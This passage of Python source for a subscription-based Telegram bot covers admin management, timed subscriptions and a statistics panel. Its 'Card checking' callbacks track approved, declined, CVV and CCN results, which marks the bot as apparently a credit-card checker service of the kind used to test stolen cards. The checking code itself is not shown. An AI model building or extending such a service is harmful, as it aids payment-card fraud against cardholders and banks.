                    target_username = message.forward_from.username
                else:
                    target_user_id = int(message.text.strip())
                    target_username = None
                
                success = add_admin(target_user_id, target_username)
                
                if success:
                    bot.send_message(
                        message.chat.id, 
                        f"✅ Successfully added admin: `{target_user_id}`",
                        parse_mode="MarkdownV2" # Changed to MarkdownV2
                    )
                else:
                    bot.send_message(message.chat.id, "❌ Failed to add admin\\. Database error\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
                
                del waiting_for_admin_action[user_id]
                
            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid input\\. Forward a message from user or send their ID\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        
        elif action == 'remove_admin':
            try:
                target_user_id = int(message.text.strip())
                
                if target_user_id in ADMIN_IDS:
                    bot.send_message(message.chat.id, "❌ Cannot remove main admin\\!", parse_mode="MarkdownV2") # Escaped for MarkdownV2
                else:
                    success = remove_admin(target_user_id)
                    
                    if success:
                        bot.send_message(
                            message.chat.id, 
                            f"✅ Successfully removed admin: `{target_user_id}`",
                            parse_mode="MarkdownV2" # Changed to MarkdownV2
                        )
                    else:
                        bot.send_message(message.chat.id, "❌ Admin not found or database error\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
                
                del waiting_for_admin_action[user_id]
                
            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid user ID\\. Please send a valid number\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2

# Admin commands for subscription management
@bot.message_handler(func=lambda m: m.text and m.text.startswith('/addsub') and is_admin(m.from_user.id))
def add_sub_command(message):
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "📋 \\*\\*Usage:\\*\\* `/addsub [user_id] [hours/days]`\n\n\\*\\*Examples:\\*\\*\n• `/addsub 123456789 24h`\n• `/addsub 123456789 7d`", parse_mode="MarkdownV2") # Escaped for MarkdownV2
            return
            
        user_id = int(parts[1])
        duration = parts[2]
        
        if duration.endswith('h'):
            hours = int(duration[:-1])
            success = update_subscription(user_id, hours=hours)
            if success:
                bot.reply_to(message, f"✅ Added {hours} hours subscription to user `{user_id}`", parse_mode="MarkdownV2") # Changed to MarkdownV2
            else:
                bot.reply_to(message, "❌ Failed to add subscription\\. Database error\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        elif duration.endswith('d'):
            days = int(duration[:-1])
            success = update_subscription(user_id, days=days)
            if success:
                bot.reply_to(message, f"✅ Added {days} days subscription to user `{user_id}`", parse_mode="MarkdownV2") # Changed to MarkdownV2
            else:
                bot.reply_to(message, "❌ Failed to add subscription\\. Database error\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
        else:
            bot.reply_to(message, "❌ Invalid format\\! Use 'h' for hours or 'd' for days\\.", parse_mode="MarkdownV2") # Escaped for MarkdownV2
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {escape_markdown_v2(str(e))}", parse_mode="MarkdownV2") # Changed to MarkdownV2

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    # Card checking callbacks
    if call.data == "stop_check":
        stop_flag[call.message.chat.id] = True
        bot.answer_callback_query(call.id, "ℹ️ Check stopped")
        return
    elif call.data in ["show_approved", "show_declined", "show_cvv", "show_ccn", "show_total"]:
        bot.answer_callback_query(call.id, "ℹ️ Statistical information")
        return
    elif call.data == "none":
        bot.answer_callback_query(call.id, "ℹ️ Information only")
        return
    
    # Admin only callbacks
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only\\!") # Escaped for MarkdownV2
        return
    
    if call.data == "admin_panel":
        stats = get_user_stats()
        sub_status = "ON" if is_subscription_required() else "OFF"
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"👑 \\*\\*Admin Panel\\*\\*\n\n" # Escaped for MarkdownV2
                 f"📊 \\*\\*System Status:\\*\\*\n" # Escaped for MarkdownV2
                 f"• Subscription System: \\*\\*{sub_status}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Total Users: \\*\\*{stats['total']}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Active Subscriptions: \\*\\*{stats['active_subs']}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Expired Subscriptions: \\*\\*{stats['expired_subs']}\\*\\*\n\n" # Escaped for MarkdownV2
                 f"🔧 \\*\\*Management Options:\\*\\*", # Escaped for MarkdownV2
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=generate_admin_panel()
        )
    
    elif call.data == "toggle_subscription":
        new_status = toggle_subscription_system()
        status_text = "ON" if new_status else "OFF"
        
        # Update the panel with new status
        stats = get_user_stats()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"👑 \\*\\*Admin Panel\\*\\*\n\n" # Escaped for MarkdownV2
                 f"📊 \\*\\*System Status:\\*\\*\n" # Escaped for MarkdownV2
                 f"• Subscription System: \\*\\*{status_text}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Total Users: \\*\\*{stats['total']}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Active Subscriptions: \\*\\*{stats['active_subs']}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Expired Subscriptions: \\*\\*{stats['expired_subs']}\\*\\*\n\n" # Escaped for MarkdownV2
                 f"🔧 \\*\\*Management Options:\\*\\*", # Escaped for MarkdownV2
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=generate_admin_panel()
        )
        bot.answer_callback_query(call.id, f"🔄 Subscription system: {status_text}")
    
    elif call.data == "manage_admins":
        admins = get_all_admins()
        admin_list = ""
        
        if admins:
            for admin_id, username in admins:
                status = " \\[MAIN\\]" if admin_id in ADMIN_IDS else "" # Escaped for MarkdownV2
                admin_list += f"• `{admin_id}` \\- {escape_markdown_v2(username or 'No username')}{status}\n" # Escaped for MarkdownV2
        else:
            admin_list = "No additional admins found\\." # Escaped for MarkdownV2
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"👑 \\*\\*Admin Management\\*\\*\n\n" # Escaped for MarkdownV2
                 f"📋 \\*\\*Current Admins:\\*\\*\n{admin_list}\n" # Escaped for MarkdownV2
                 f"🔧 \\*\\*Management Options:\\*\\*", # Escaped for MarkdownV2
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=generate_admin_list()
        )
    
    elif call.data == "add_admin":
        waiting_for_admin_action[user_id] = 'add_admin'
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="➕ \\*\\*Add New Admin\\*\\*\n\n" # Escaped for MarkdownV2
                 "📋 \\*\\*Options:\\*\\*\n" # Escaped for MarkdownV2
                 "• Forward a message from the user\n"
                 "• Send their User ID directly\n\n"
                 "👤 Send the user information now:",
            parse_mode="MarkdownV2" # Changed to MarkdownV2
        )
        bot.answer_callback_query(call.id, "📋 Send user info to add as admin")
    
    elif call.data == "remove_admin":
        waiting_for_admin_action[user_id] = 'remove_admin'
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="➖ \\*\\*Remove Admin\\*\\*\n\n" # Escaped for MarkdownV2
                 "📋 Send the User ID of admin to remove:\n\n"
                 "⚠️ \\*\\*Note:\\*\\* Main admins cannot be removed\\.", # Escaped for MarkdownV2
            parse_mode="MarkdownV2" # Changed to MarkdownV2
        )
        bot.answer_callback_query(call.id, "📋 Send user ID to remove admin")
    
    elif call.data == "add_subscription":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="💎 \\*\\*Add Subscription\\*\\*\n\n" # Escaped for MarkdownV2
                 "⏰ \\*\\*Select Duration:\\*\\*\n" # Escaped for MarkdownV2
                 "Choose how long the subscription should last:",
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=generate_subscription_panel()
        )
    
    elif call.data == "show_stats":
        stats = get_user_stats()
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"📊 \\*\\*System Statistics\\*\\*\n\n" # Escaped for MarkdownV2
                 f"👥 \\*\\*Users:\\*\\*\n" # Escaped for MarkdownV2
                 f"• Total Registered: \\*\\*{stats['total']}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Active Subscriptions: \\*\\*{stats['active_subs']}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Expired Subscriptions: \\*\\*{stats['expired_subs']}\\*\\*\n\n" # Escaped for MarkdownV2
                 f"⚙️ \\*\\*System:\\*\\*\n" # Escaped for MarkdownV2
                 f"• Subscription Required: \\*\\*{'Yes' if is_subscription_required() else 'No'}\\*\\*\n" # Escaped for MarkdownV2
                 f"• Total Admins: \\*\\*{len(get_all_admins())}\\*\\*", # Escaped for MarkdownV2
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]])
        )
    
    elif call.data == "show_users":
        users = get_all_users()
        user_list = ""
        
        for i, (uid, username, first_name, sub_end, created_at) in enumerate(users[:10]):
            status = "✅ Active" if sub_end and sub_end > datetime.now() else "❌ Expired"
            user_list += f"{i+1}\\. `{uid}` \\- {escape_markdown_v2(first_name or 'No name')} \\({status}\\)\n" # Escaped for MarkdownV2
        
        if len(users) > 10:
            user_list += f"\n\\.\\.\\. and {len(users) - 10} more users" # Escaped for MarkdownV2
        elif not users:
            user_list = "No users found\\." # Escaped for MarkdownV2
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"👥 \\*\\*Recent Users\\*\\*\n\n{user_list}", # Escaped for MarkdownV2
            parse_mode="MarkdownV2", # Changed to MarkdownV2
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]])
        )
    
    # Subscription duration callbacks
    elif call.data.startswith("sub_"):
        duration = call.data[4:]
        
        # Parse duration
        if duration.endswith('h'):
            amount = int(duration[:-1])
            duration_type = 'hours'
            duration_text = f"{amount} hour{'s' if amount > 1 else ''}"
        elif duration.endswith('d'):
            amount = int(duration[:-1])
            duration_type = 'days'
            duration_text = f"{amount} day{'s' if amount > 1 else ''}"
        
        # Store waiting state
        waiting_for_user_id[user_id] = {
            'amount': amount,
            'type': duration_type
        }
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"💎 \\*\\*Add {duration_text} Subscription\\*\\*\n\n" # Escaped for MarkdownV2
                 f"📋 \\*\\*Options:\\*\\*\n" # Escaped for MarkdownV2
                 f"• Forward a message from the user\n"
                 f"• Send their User ID directly\n\n"
                 f"👤 Send the user information now:",
            parse_mode="MarkdownV2" # Changed to MarkdownV2
        )
        bot.answer_callback_query(call.id, f"📋 Send user ID for {duration_text} subscription")
    
    # Admin info callbacks
    elif call.data.startswith("admin_info_"):
        admin_id = int(call.data.split("_")[-1])
        bot.answer_callback_query(call.id, f"ℹ️ Admin ID: {admin_id}")

# Initialize database on startup
if __init_success := init_db():
    print("🤖 Bot is running with subscription system...")
    print("✅ Database connection established")
    print(f"👑 Main admin: {ADMIN_IDS[0]}")
    print(f"🔧 Contact: {CONTACT_INFO['username']}")
else:
    print("❌ Failed to initialize database! Check connection.")

bot.infinity_polling()
